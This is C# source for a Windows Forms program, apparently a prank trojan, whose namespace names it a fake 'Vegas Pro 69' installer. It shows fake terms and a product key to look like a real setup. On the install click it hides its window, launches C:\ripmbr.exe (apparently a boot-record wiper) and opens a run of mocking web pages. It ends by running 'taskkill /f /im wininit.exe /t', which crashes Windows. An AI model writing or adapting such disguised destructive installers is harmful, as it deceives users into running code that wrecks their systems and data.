using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Trojan.Fake.Vegaspro69
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.groupBox1.Visible = false;
            this.groupBox2.Visible = false;
            this.richTextBox1.Text += "\n---Terms of use--- \n\n\nWe're no strangers to love\nYou know the rules and so do I\nA full commitment's what I'm thinking of\nYou wouldn't get this from any other guy\nI just wanna tell you how I'm feeling\nGotta make you understand\n\nNever gonna give you up\nNever gonna let you down\nNever gonna run around and desert you\nNever gonna make you cry\nNever gonna say goodbye\nNever gonna tell a lie and hurt you\n\n\n\n -----END-----";
            this.textBox1.ReadOnly = true;
            this.richTextBox1.ReadOnly = true;
            this.textBox1.Text = "TX9XD-98N7V-6WMQ6-BX7FG-H8Q99";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var waitclick = MessageBox.Show("You need to exit from vegas pro setup?", "Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (waitclick.ToString() == "Yes")
            {
                Application.Exit();
            }
            else
            {
                return;
            }
        }

        private void Next_Click(object sender, EventArgs e)
        {
            this.groupBox1.Visible = true;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            this.groupBox2.Visible = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var checkvc = System.IO.File.Exists(@"C:\Windows\System32\VCRUNTIME140.DLL");
            if (checkvc == true)
            {
                return;
            }
            else
            {
                MessageBox.Show("YOUR SYSTEM DIDN'T INSTALL VISUAL C++ PLEASE INSTALL BEFORE USE THIS INSTALLER!", "Error", MessageBoxButtons.OK,MessageBoxIcon.Error);
                Application.Exit();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            System.Diagnostics.Process.Start(@"C:\ripmbr.exe");
            System.IO.File.WriteAllText(@"C:\riptou.txt", "Vegas pro 69 is install done now enjoy with .... >3");
            System.Diagnostics.Process.Start("notepad.exe ", @"C:\riptou.txt");

            Thread.Sleep(5000);
            System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
            Thread.Sleep(10000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=How+to+uninstall+bitch+malware&oq=How+to+uninstall+bitch+malware&aqs=chrome..69i57.10934j0j4&sourceid=chrome&ie=UTF-8");
            Thread.Sleep(10000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=Im+joke+on+u%3F&oq=Im+joke+on+u%3F&aqs=chrome..69i57j0i10i22i30j0i390l3.3325j0j4&sourceid=chrome&ie=UTF-8");
            Thread.Sleep(11000);
            System.Diagnostics.Process.Start("https://www.malwarebytes.com/mwb-download");
            Thread.Sleep(10000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=Uninstall+Windows&oq=Uninstall+Windows+&aqs=chrome..69i57j0i512l9.4680j0j4&sourceid=chrome&ie=UTF-8");
            Thread.Sleep(10000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=how+to+install+gentoo+linux&oq=How+to+install+gentoo+linux&aqs=chrome.0.0i512l3j0i22i30l3.4856j0j4&sourceid=chrome&ie=UTF-8");
            Thread.Sleep(10000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=r%2Ffemboy&oq=r%2Ffemboy&aqs=chrome..69i57j69i58.3197j0j9&sourceid=chrome&ie=UTF-8");
            Thread.Sleep(12000);
            System.Diagnostics.Process.Start("https://www.reddit.com/r/femboy/");
            Thread.Sleep(15000);
            System.Diagnostics.Process.Start("https://stackoverflow.com/questions/15445285/how-can-i-connect-to-a-tor-hidden-service-using-curl-in-php");
            Thread.Sleep(18000);
            System.Diagnostics.Process.Start("https://www.google.com/search?q=what+you+do+saying+with+last+word%3F+i+need+to+say+u+goodbye%21&ei=dwwaYoDIOJHdmAXplIS4Dg&ved=0ahUKEwjA34PGn532AhWRLqYKHWkKAecQ4dUDCA4&uact=5&oq=what+you+do+saying+with+last+word%3F+i+need+to+say+u+goodbye%21&gs_lcp=Cgdnd3Mtd2l6EAM6BwgAEEcQsANKBAhBGABKBAhGGABQogdYogdgughoAXABeACAAS2IAS2SAQExmAEAoAEByAEIwAEB&sclient=gws-wiz");
            Thread.Sleep(4000);
            System.Diagnostics.Process.Start("cmd.exe ", "/K taskkill /f /im wininit.exe /t");

        }
    }
}
